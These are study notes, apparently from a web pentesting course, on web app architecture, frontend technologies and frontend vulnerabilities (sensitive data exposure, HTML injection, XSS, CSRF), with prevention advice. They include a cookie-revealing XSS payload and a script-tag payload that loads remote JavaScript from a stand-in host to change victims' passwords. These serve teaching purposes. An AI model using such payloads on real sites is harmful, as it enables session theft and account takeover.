
# Introduction to web applications
## Introduction 

### What Are Web Applications

- Interactive apps running in browsers (client–server model).
- **Frontend** = HTML/CSS/JS in browser.
- **Backend** = server-side code + databases.
- Examples: Gmail, Amazon, Google Docs.

### Web Applications vs Websites

- **Websites (Web 1.0)**: static, non-interactive, same content for all users
- **Web Applications (Web 2.0)**: dynamic, interactive, user-specific content.
- Key advantages: modular, responsive, cross-platform.

### Web Apps vs Native OS Apps

**Web apps**

- Platform-independent; run in browsers.
- No installation needed.
- Easy updates → all users on same version.

**Native apps**

- Faster, access OS/hardware features.
- More powerful but require per-OS builds.

**Hybrid/PWA(progressive web app)**: combine both benefits.

### Distribution of Web Applications

- **Open-source:** WordPress, Joomla, OpenCart.
- **Closed-source:** Shopify, Wix, DotNetNuke.

### Security Risks

- Web apps are globally accessible → large attack surface.
- Vulnerabilities common due to complexity + rapid updates.
- Attacks may compromise servers, databases, sensitive data.
- Requires continuous testing + secure coding.

### Pentesting Approach

- Follow OWASP testing methodology.
- Test:
    
    - **Frontend (HTML/CSS/JS)** → XSS, sensitive data exposure.
    - **Backend interactions** → logic flaws, auth issues.
        
- Test both **unauthenticated + authenticated** paths.
    
### Common Real-World Attack Examples

- **SQL Injection:** extract data; pivot to attacks like password spraying.
- **File Inclusion:** read code, find hidden features → RCE.
- **Unrestricted File Upload:** upload webshell → takeover server.
- **IDOR:** access or modify other users' data.
- **Broken Access Control:** privilege escalation (e.g., change roleID).


## Web Application Layout


### Three Main Categories

1. **Infrastructure** – physical/logical setup (servers, databases).
2. **Components** – UI/UX, client, server, microservices, databases.
3. **Architecture** – relationships between components (layers).

### Web Application Infrastructure Models

#### 1. Client–Server

![[client-server-model 1.jpg]]

- Browser (client) ↔ Web server (backend code + logic).
- Most common model.

#### 2. One Server

![[one-server-arch.jpg]]

- Everything (web app + DB) on one server.
- Simple but high risk → single point of failure.

#### 3. Many Servers – One Database

![[many-server-one-db-arch.jpg]]

- Multiple web servers share one DB.
- Better segmentation + availability.

#### 4. Many Servers – Many Databases

![[many-server-many-db-arch.jpg]]

- Separate DB per app (or per function).
- High redundancy, strong isolation, scalable.

_Other models:_ microservices, serverless.

### Web Application Components

- **Client:** browser/UI.
- **Server:** webserver, backend logic, database.
- **Services:** microservices, 3rd-party APIs, internal integrations.
- **Functions:** serverless functions triggered per request.

### Three-Tier Architecture

1. **Presentation Layer:** UI (HTML/CSS/JS).
2. **Application Layer:** logic, auth, processing.
3. **Data Layer:** storage + DB operations.
    
### Microservices

- Independent small services (e.g., Search, Login, Payments).
- Stateless communication.
- Can use different languages.
- Benefits: agility, scalability, easy deployment, resilience.

### Serverless Architecture

- Cloud handles infrastructure (AWS/GCP/Azure).
- Uses stateless compute (e.g., Lambda).
- Pros: no server managmet, auto-scaling, lower overhead.
    
### Architecture Security

- Vulnerabilities often come from **design flaws**, not just code.
    
- Examples:
    
    - Poor RBAC → users access admin features.
    - Segregated DB → attacker on backend may not reach main DB.

- Security must be applied at **every stage** of development.

## Front End vs Back End 
### Front End (Client-Side)

- Runs in the **browser** (HTML, CSS, JavaScript).
- Handles **UI/UX**, layout, visuals, interactivity.
- Must work on all screen sizes + devices.
- Poor frontend optimization → slow, unresponsive application.
- Tasks include:
    
    - Visual design
    - UI design
    - UX design

### Back End (Server-Side)

- Core logic executed on **backend server**.
- Drives all app functionality; user does not see it.
- **Main components:**
    
    - **Backend servers** (Linux/Windows)
    - **Web servers**: Apache, NGINX, IIS
    - **Databases**: MySQL, MSSQL, Oracle, PostgreSQL, MongoDB
    - **Development frameworks**: Laravel, ASP.NET, Django, Spring, Express
	![[backend-server.jpg]]
        
- **Can be deployed on:**
    
    - Dedicated servers
    - Containers (Docker)
    - Separate servers for isolation
        
- **Responsibilities:**
    
    - Application logic
    - Database operations
    - API development
    - Integrations (cloud, third-party, internal services)

### Securing Frontend & Backend

- Frontend vulnerabilities often involve **client-side issues** (XSS, data exposure)
- Backend issues often involve **logic flaws, injections, auth bypass, insecure storage**.
- Testing approaches:
    
    - **Whitebox**: full source code access.
    - **Blackbox**: no code access (most common).
    - **Greybox**: partial knowledge.
        
- Severe backend issues include:
    
    - SQL injection
    - Command injection
    - LFI/RFI → reading source code, sensitive files
    - Weak authentication/authorization
        
### Common Developer Mistakes

- Allowing invalid data into DB
- Storing plaintext or weak passwords
- Excessive trust in client-side
- Hardcoded backdoors
- Using insecure or outdated components
- Failing to encrypt data properly
- URL-based variable misuse
- SQL injections, file inclusions
- Misconfigured WAF
  
These mistakes lead to **OWASP Top 10 vulnerabilities**:

### OWASP Top 10 (Summary)

1. **Broken Access Control**
2. **Cryptographic Failures**
3. **Injection (SQLi, Command Injection, etc.)**
4. **Insecure Design**
5. **Security Misconfiguration**
6. **Vulnerable & Outdated Components**
7. **Auth & Identification Failures**
8. **Integrity Failures (Supply chain issues)**
9. **Logging/Monitoring Failures**
10. **SSRF**

# Front End Components 

## HTML 

### What HTML Is

- **HyperText Markup Language** → core structure of all webpages.
- Defines elements like titles, text, forms, images, buttons.
- Browser **interprets and renders** these elements visually.
    
## **Basic HTML Structure**

```html
<!DOCTYPE html> 
<html>   
	<head>     
		<title>Page Title</title>   
	</head>   
	<body>     
		<h1>A Heading</h1>     
		<p>A Paragraph</p>   
	</body> 
</html>
```

- Root element: **\<html>**
- **\<head>** → non-visible info (title, metadata, styles).
- **\<body>** → visible content.

HTML = **tree structure** (DOM):  
document → html → head/body → elements (h1, p, etc.).
### HTML Elements

- Written as **opening + closing tags** with content inside.  
    Example: `<p>Text</p>`
- Can include attributes like **id** or **class** for styling/JS:
    
    - `<p id="note">`
    - `<div class="container">`
        

### URL Encoding (Percent-Encoding)

- Needed because URLs support only ASCII-safe characters.
- Unsafe characters become `%` + hex value.
    
    - Space → `%20` or `+`
    - `'` → `%27`
    - `#` → `%23`
        
- Used when passing parameters in GET requests.
- Tools: Burp Suite Decoder, online encoders.
    
### DOM (Document Object Model)

- Browser’s internal tree representation of HTML.
- Allows JavaScript to **access & modify** page structure.
- DOM types:
    
    - **Core DOM**
    - **XML DOM**
    - **HTML DOM**

**Examples:**

- `document.head`
- `document.body`
- `document.getElementById("id")`

### Why DOM Matters for Security

- Needed to find elements, inspect structure, and identify issues.
- Essential for exploiting/understanding:
    
    - **XSS**
    - **DOM-based vulnerabilities**
    - **HTML/JS manipulation**


## CSS 

### What CSS Is

- **Cascading Style Sheets** → controls the **appearance** of HTML elements.
- Works together with HTML to define layout, colors, fonts, spacing, animations, etc.
- Newer versions add more styling capabilities; browsers update to support them.

### Basic Example

```css
body { 
	background-color: black; 
}  
h1 { 
	color: white; 
	text-align: center; 
}  
p { 
font-family: helvetica; 
font-size: 10px; 
}
```

- Styles apply to all matching elements unless scoped by **class** or **id**.
    
### CSS Syntax

`selector {    property: value; }`

- Selectors can be:
    
    - **Tags**: `body`, `h1`
    - **Classes**: `.title`
    - **IDs**: `#main`
        
- Properties include: **color, font-size, margin, padding, border, width, height, position, etc**.

### Capabilities

- Controls **layout, fonts, colors, spacing**
- Supports **advanced animations** using:
    
    - `@keyframes`
    - `animation`, `animation-duration`, etc.
        
- Often combined with **JavaScript** to dynamically change styles.

### Uses Beyond HTML

- Can style **XML**, **SVG**, and interfaces in modern mobile frameworks.

### CSS Frameworks

Used to speed up development and provide pre-built UI components:

- **Bootstrap**
- **SASS**
- **Foundation**
- **Bulma**
- **Pure**

These frameworks simplify responsive layouts and common design patterns.


## JavaScript 

### What JavaScript Is

- One of the world’s most widely used languages.
- Runs mainly in the **browser (front end)** but also on the **backend** via Node.js.
- Provides **functionality + interactivity** to webpages (HTML = structure, CSS = style, JS = behavior).

### Basic Usage

Embedded JavaScript:

`<script>   // JS code here </script>`

External script:

`<script src="script.js"></script>`

Example:

`document.getElementById("button1").innerHTML = "Changed Text!";`

→ Dynamically changes page content.

### What JavaScript Is Used For

- Update page content **in real time**.
- Handle **user input** & events (clicks, typing, drag, etc.).
- Make **HTTP requests** (AJAX, Fetch).
- Build **dynamic interfaces**, animations, and real-time features.
- Automate complex front-end logic.

Browsers execute JS using built-in engines (V8, SpiderMonkey, etc.).
### JavaScript Frameworks

Used to speed up development and manage complex applications:

**Front-end frameworks/libraries:**

- **Angular**
- **React**
- **Vue**
- **jQuery**

**Frameworks provide:**

- **Component-based UI**
- **Routing**
- **State management**
- **Reusable functions**
- **Easier API integration**
    
### Why JavaScript Matters

- Without JS, web pages are static.
- With JS, pages become interactive: **animations, data updates, forms, dashboards, single-page apps, etc.**
- Essential for modern web application development and pentesting (e.g., manipulating DOM during XSS).

# Front End Vulnerabilities 

## Sensitive Data Exposure 
### What It Is

- Sensitive data (credentials, tokens, internal links, comments, user info) exposed **in front-end code** (HTML/JS).
- Visible to anyone via **View Page Source**, DevTools, or a proxy (Burp).
- Does **not** require backend access.

### Why It Matters

- Frontend vulnerabilities can affect users directly.
- If exposed data relates to **admin accounts or backend functionality**, it may lead to:
    
    - Unauthorized access
    - Data leaks
    - Server compromise
    - Abuse of hidden functionality
### Common Places Sensitive Data Appears

- HTML comments
- JavaScript files
- Hardcoded test credentials
- Debug parameters
- Hidden directories or endpoints
- API keys or tokens
- User information in the DOM

**Example**

HTML source reveals developer comment with credentials:

`<!-- TODO: remove test credentials test:test -->`

→ Can be used to log in.

### How Attackers Use It

- View Page Source (`Ctrl+U`)
- Inspect external JS files
- Check comments, unused code, hidden forms
- Use tools to extract URLs, API endpoints, and comments
    

Leads to:

- **Privilege escalation**
- **Accessing hidden admin pages**
- **Further backend attacks**
    
### Prevention

- **Do not store sensitive data client-side** (HTML/JS).
- Remove comments, debug code, hidden test endpoints.
- Use **obfuscation/minification** for JS (not a security control, but refuces accidental leaks).
- Apply **proper data classification**: only expose what is required.
- Code reviews and automated scanners.

## HTML Injection 

### What HTML Injection Is

- Happens when **user input is inserted into the page without sanitization**.
- Browser interprets input as **HTML**, allowing attackers to modify the page.
- Similar to stored/reflected XSS but without JavaScript execution (though often leads to XSS).
    
## Why It Happens

- Unfiltered user input displayed in:
    
    - Comments
    - Profile fields
    - Output via JavaScript (`innerHTML`)
        
- No validation or sanitization on **front end** or **back end**.
    
### Risks / Impact

- **Page defacement** – attacker alters the appearance of the site.
- **Phishing** – attacker injects fake login forms to steal credentials.
- **Malicious content injection** – ads, images, iframes, misleading UI.
- **Can enable XSS** if scripts are allowed.

### Example Scenario

Vulnerable code:

`document.getElementById("output").innerHTML = "Your name is " + input;`

Attacker inputs HTML:

`<style> body { background-image:url('...'); } </style>`

→ Browser renders it → page appearance is modified.

### Key Signs of Vulnerability

- Use of `.innerHTML` with raw user input.
- No escaping or filtering.
- Input from prompt/forms directly written into the DOM.
### Prevention

- **Sanitize + validate** all user input (front end + back end).
- Use **safe DOM APIs**:
    
    - `.innerText` or `.textContent` instead of `.innerHTML`.
        
- Escape HTML characters (`<`, `>`, `'`, `"`, `/`).
- Use trusted templating engines that auto-escape HTML.

## Cross-Site Scripting (XSS)

- XSS occurs when **JavaScript** is injected and executed on the client-side.
- Similar to HTML Injection but allows **advanced attacks** since JS runs in the user’s browser.
- Can lead to access to the victim’s **account or machine**.
### Types of XSS

- **Reflected XSS** – user input is displayed after processing (search results, errors).
- **Stored XSS** – user input stored in backend DB and displayed later (comments, posts).
- **DOM XSS** – user input directly shown in browser and written to DOM (page title, username).

### Example

Payload used:

`#"><img src=/ onerror=alert(document.cookie)>`

- Shows the **cookie value** in an alert box.
- Browser treats input as a new DOM and executes the JavaScript.

### Impact 

- Attacker can **steal cookie sessions**.
- Can authenticate as the victim.
- Can perform various other attacks on web application users.

## Cross-Site Request Forgery (CSRF) 

### What CSRF Is

- A front-end vulnerability caused by **unfiltered user input**.
- Attacker forces a victim (already authenticated) to perform unintended actions on a web app.
- Often uses **XSS** to execute malicious actions automatically.
- Can also use **HTTP parameters** for attacks.
    
### How CSRF Is Used

- Attacker crafts JavaScript that performs actions **as the victim**.
- Common goal: **change victim’s password** automatically → attacker logs into victim’s account.
- Can target **admins** to access privileged/sensitive functionality.
- Example payload to load remote malicious JS:

`"><script src=//www.example.com/exploit.js></script>`

- exploit.js contains code that performs actions such as password changes, based on the web application's API.
    
### Prevention 

**1. Input Controls**

- **Sanitization** → remove special / non-standard characters.
- **Validation** → ensure input matches expected format.
    

**2. Output Sanitization**

- Sanitize displayed content to prevent HTML/JS execution even if filters are bypassed.
    

**3. Additional Defenses**

- Use **WAF**, but cannot rely solely on it.
- Browsers implement protections against auto JS execution.
- Anti-CSRF mechanisms:
    
    - **Unique CSRF token per session/request**
    - **SameSite cookie attribute** (Strict / Lax)
    - **Functional protections** (e.g., re-enter password before sensitive actions)
